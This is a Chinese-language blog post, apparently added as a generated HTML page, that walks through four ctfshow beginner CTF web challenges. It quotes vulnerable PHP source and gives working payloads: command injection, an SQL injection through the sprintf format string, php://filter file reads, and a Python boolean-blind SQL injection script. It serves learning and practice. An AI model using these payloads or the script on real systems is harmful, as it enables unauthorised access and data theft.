@@ -1,0 +1,365 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ctfshow-萌新赛 - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="签到题12345678910111213&amp;lt;?php if(isset($_GET[&amp;#x27;url&amp;#x27;]))&amp;#123;    system(&amp;quot;curl https://&amp;,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">ctfshow-萌新赛</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">ctfshow-萌新赛</h1>
+        <div class="stuff">
+            <span>八月 29, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/ctfshow%E5%88%B7%E9%A2%98/" rel="tag">ctfshow刷题</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;curl https://&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>].<span class="string">&quot;.ctf.show&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>任意命令执行,将前后进行闭合即可:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">baidu.com;ls;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">baidu.com;cat flag;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="1.png"></p>
+<h3 id="假赛生"><a href="#假赛生" class="headerlink" title="假赛生"></a>假赛生</h3><ul>
+<li>提示：register.php login.php</li>
+</ul>
+<p>打开页面：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  show_source(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$name</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="variable">$sql</span>=<span class="string">&#x27;select pass from user where name=&quot;&#x27;</span>.<span class="variable">$name</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$sql</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  system(<span class="string">&#x27;4rfvbgt56yhn.sh&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$query</span>=mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$result</span>=mysqli_fetch_assoc(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$name</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;admin!!!!!&quot;</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">      preg_replace_callback(<span class="string">&quot;/\w\W*/&quot;</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);&#125;,<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>],<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;you not admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>源码分析：</li>
+</ul>
+<p>需要登录的姓名是admin，get传参绕过      preg_replace_callback(“/\w\W*/“,function(){die(“not allowed!”);},$_GET[‘c’],1);判断，就能输出flag。</p>
+<p>一个个解决：</p>
+<ol>
+<li>注册时发现直接注册admin是行不通的，想到原来的绕过，直接在admin后加空格进行尝试，发现注册成功，登录时使用admin登录：</li>
+</ol>
+<p><img src="2.png"></p>
+<ol start="2">
+<li>get传入的参数需要绕过/\w\W*/“</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\w :匹配包括下划线的任何单词字符,等价于 [A-Z a-z <span class="number">0</span>-<span class="number">9</span>_]</span><br><span class="line"></span><br><span class="line">\W :匹配任何非单词字符,等价于 [^A-Z a-z <span class="number">0</span>-<span class="number">9</span>_]</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>这 …这不就什么都限制了嘛，一开始还想了很久要传什么编码之类的，后来发现，什么都不让传就什么都不传，尝试留空：</p>
+<p><img src="3.png"></p>
+<p>得到flag。</p>
+<h3 id="给她"><a href="#给她" class="headerlink" title="给她"></a>给她</h3><h4 id="题目的开始"><a href="#题目的开始" class="headerlink" title="题目的开始"></a>题目的开始</h4><p><img src="4.png"></p>
+<ul>
+<li>SQL语句，尝试进行SQL注入，发现常规注入测试没法闭合，尝试使用ctf-wscan扫描，存在flag.txt，访问发现没有flag。存在.git/config等文件，但是下载打开也没发现什么。</li>
+</ul>
+<p>查看wp有发现说是.git源码泄露，尝试进行扫描：</p>
+<p>这里下载Git_Extract]工具进行扫描，发现有hint.php文件，打开得到源码：</p>
+<p><img src="5.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$pass</span>=sprintf(<span class="string">&quot;and pass=&#x27;%s&#x27;&quot;</span>,addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=sprintf(<span class="string">&quot;select * from user where name=&#x27;%s&#x27; <span class="subst">$pass</span>&quot;</span>,addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><ul>
+<li>addslashes():返回在预定义字符之前添加反斜杠的字符串。</li>
+</ul>
+<p>预定义字符是：</p>
+<ul>
+<li>单引号（’）</li>
+<li>双引号（”）</li>
+<li>反斜杠（\）</li>
+<li>NULL</li>
+</ul>
+<p><img src="6.png"></p>
+<p><strong>sprintf() 函数把格式化的字符串写入变量中。</strong></p>
+<p><em>*<em>arg1</em>、*arg2</em>、*++* 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 <em>arg1</em>，在第二个 % 符号处，插入 <em>arg2</em>，依此类推。**</p>
+<p><strong>注释：如果 % 符号多于 <em>arg</em> 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 “$“ 组成。</strong></p>
+<p><strong>语法</strong></p>
+<p>sprintf(<em>format</em>,<em>arg1</em>,<em>arg2</em>,<em>arg++</em>)</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>format</em></td>
+<td>必需。规定字符串以及如何格式化其中的变量。可能的格式值：%% - 返回一个百分号 %%b - 二进制数%c - ASCII 值对应的字符%d - 包含正负号的十进制数（负数、0、正数）%e - 使用小写的科学计数法（例如 1.2e+2）%E - 使用大写的科学计数法（例如 1.2E+2）%u - 不包含正负号的十进制数（大于等于 0）%f - 浮点数（本地设置）%F - 浮点数（非本地设置）%g - 较短的 %e 和 %f%G - 较短的 %E 和 %f%o - 八进制数%s - 字符串%x - 十六进制数（小写字母）%X - 十六进制数（大写字母）附加的格式值。必需放置在 % 和字母之间（例如 %.2f）：+ （在数字前面加上 + 或 - 来定义数字的正负性。默认情况下，只有负数才做标记，正数不做标记）’ （规定使用什么作为填充，默认是空格。它必须与宽度指定器一起使用。例如：%’x20s（使用 “x” 作为填充））- （左调整变量值）[0-9] （规定变量值的最小宽度）.[0-9] （规定小数位数或最大字符串长度）注释：如果使用多个上述的格式值，它们必须按照以上顺序使用。</td>
+</tr>
+<tr>
+<td><em>arg1</em></td>
+<td>必需。规定插到 <em>format</em> 字符串中第一个 % 符号处的参数。</td>
+</tr>
+<tr>
+<td><em>arg2</em></td>
+<td>可选。规定插到 <em>format</em> 字符串中第二个 % 符号处的参数。</td>
+</tr>
+<tr>
+<td><em>arg++</em></td>
+<td>可选。规定插到 <em>format</em> 字符串中第三、四等 % 符号处的参数。</td>
+</tr>
+</tbody></table>
+<p><strong>技术细节</strong></p>
+<table>
+<thead>
+<tr>
+<th>返回值：</th>
+<th>返回已格式化的字符串。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PHP 版本：</td>
+<td>4+</td>
+</tr>
+</tbody></table>
+<ol>
+<li>不带占位符：</li>
+</ol>
+<p>使用格式值 %f：</p>
+<p><img src="7.png"></p>
+<ol start="2">
+<li>带占位符：</li>
+</ol>
+<p><img src="8.png"></p>
+<p>如果 % 符号多于 <em>arg</em> 参数时不使用占位符的话就会报错，不能返回正确结果。</p>
+<p><img src="9.png"></p>
+<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p><strong>sprintf()格式化字符串漏洞-注入原理：</strong></p>
+<p><img src="10.png"></p>
+<p>然后有看到了一个跟题目差不多的例子，进行对应改变测试：</p>
+<p><img src="11.png"></p>
+<ul>
+<li>由于我们无法知道正确的用户名，所以把判断语句  and 1=1改为 or 1即可，pass中的%1$被置换为空，单引号与前面闭合，剩下 or 1语句永真，成功绕过判断。</li>
+</ul>
+<p><img src="12.png"></p>
+<ul>
+<li>对其进行传值：</li>
+</ul>
+<p><strong>?name=1&amp;pass=%1$’ or 1%23</strong>，#不能使用。</p>
+<p>返回界面好像没有东西，查看源代码发现 flag in/flag的提示，但是直接访问不行。</p>
+<p><img src="13.png"></p>
+<ul>
+<li>尝试抓包，到这里就不会了。没有注意到<strong>cookies处的参数file</strong>。</li>
+</ul>
+<p><img src="14.png"></p>
+<ul>
+<li>尝试抓包，发现cookie处含有file参数，推测该处含有文件包含或者是文件读取漏洞，尝试对字符进行16进制解码，得到其为flag.txt，尝试读取/flag:</li>
+</ul>
+<p>能直接得到flag。</p>
+<p><img src="15.png"></p>
+<h4 id="题后"><a href="#题后" class="headerlink" title="题后"></a>题后</h4><ul>
+<li><p>但是在查看wp的时候发现，通过/flag是无法直接获取到flag的，这里我也不知道是哪里出了问题，我尝试访问了两次/flag都是能直接得到flag的。</p>
+</li>
+<li><p>wp中有提到，由于直接读取/flag无法得到flag，尝试使用PHP伪协议：</p>
+</li>
+</ul>
+<p><strong>php://filter/read=convert.base64-encode/resource=/flag</strong></p>
+<p>返回not has base64，在这里base64无法使用。</p>
+<p>尝试使用rot13进行读取，收获到的一个新的文件读取方式：</p>
+<p><strong>php://filter/read=string.rot13/resource=/flag</strong></p>
+<p><img src="16.png"></p>
+<p>得到一段rot13编码的字符，对其进行rot13解码，得到flag。</p>
+<ul>
+<li>参考文章：</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/qingwuyou/p/10687463.html">https://www.cnblogs.com/qingwuyou/p/10687463.html</a></p>
+<h3 id="萌新记忆"><a href="#萌新记忆" class="headerlink" title="萌新记忆"></a>萌新记忆</h3><p>ctf-wscan扫描目录得到，/admin，登录界面，进行登录抓包：</p>
+<p>尝试输入admin，发现返回密码错误，再试试将admin改掉，发现返回用户名/密码错误，证明用户名就是admin。因此需要拿到admin的密码。</p>
+<p>进行简单的fuzz，会发现<strong>and or # - if =<strong>等都被过滤了， 但</strong>( ) || , substr length</strong>可以用。</p>
+<p>题目是查看了wp才知道的做法。</p>
+<p>尝试：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;||&#x27;</span>a<span class="string">&#x27;&lt;&#x27;</span>b     返回密码错误</span><br><span class="line"><span class="string">&#x27;||&#x27;</span>a<span class="string">&#x27;&lt;&#x27;</span>a     返回用户名/密码错误  </span><br><span class="line"><span class="string">&#x27;||&#x27;</span>aaaaaaaaaaaaaaaaaaaaaaaaaa    超出长度限制</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="17.png"></p>
+<p><img src="18.png"></p>
+<p>因此考虑布尔盲注：</p>
+<p>因为使用逻辑或，因此用户名只要不设置为admin就好。</p>
+<p>既然length可以使用，那么我们可以猜测一下密码字段名（password、passwd、pass、p）和其长度。</p>
+<p>当payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;||length(p)&lt;18</span><br></pre></td></tr></table></figure>
+
+<p>时，返回密码错误，当长度为17时，返回用户名/密码错误，因此可以确定密码的长度为17个字符长度。</p>
+<p>SQL语句应该是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT password FROM user WHERE username=&#x27;&#x27;||length(p)&lt;5</span><br><span class="line">SELECT password FROM user WHERE username=&#x27;&#x27;||substr(p,1,1)&lt;&#x27;g&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>由于substr也没有被过滤，所以可以考虑使用substr返回字段内容，如果不正确的话，页面会返回密码错误，字母从a-&gt;z进行判断，因此可以通过这个点进行布尔盲注脚本的编写：(偷懒了，拿了yu师傅的脚本来用)</p>
+<p>脚本链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/104703761">https://blog.csdn.net/miuzzx/article/details/104703761</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author:羽</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://a0321e48-310a-44b5-a1bb-aadc9277d85e.challenge.ctf.show:8080/admin/checklogin.php&#x27;</span></span><br><span class="line">s= <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">18</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">            data=&#123;<span class="string">&quot;u&quot;</span>:<span class="string">&quot;&#x27;||substr(p,&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1)&lt;&#x27;&quot;</span>+j,</span><br><span class="line">                          <span class="string">&quot;p&quot;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            r=requests.post(url,data=data)</span><br><span class="line">            <span class="comment">#print(r.text)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.text:</span><br><span class="line">                flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(j)-<span class="number">1</span>)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                </span><br><span class="line"> <span class="comment">#得到密码为：cptbtptpbcptdtptp</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>进行登录，得到flag。</p>
+<p><img src="19.png"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%87%E8%B5%9B%E7%94%9F"><span class="toc-number">2.</span> <span class="toc-text">假赛生</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99%E5%A5%B9"><span class="toc-number">3.</span> <span class="toc-text">给她</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%9A%84%E5%BC%80%E5%A7%8B"><span class="toc-number">3.1.</span> <span class="toc-text">题目的开始</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">3.2.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">3.3.</span> <span class="toc-text">解题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E5%90%8E"><span class="toc-number">3.4.</span> <span class="toc-text">题后</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%90%8C%E6%96%B0%E8%AE%B0%E5%BF%86"><span class="toc-number">4.</span> <span class="toc-text">萌新记忆</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
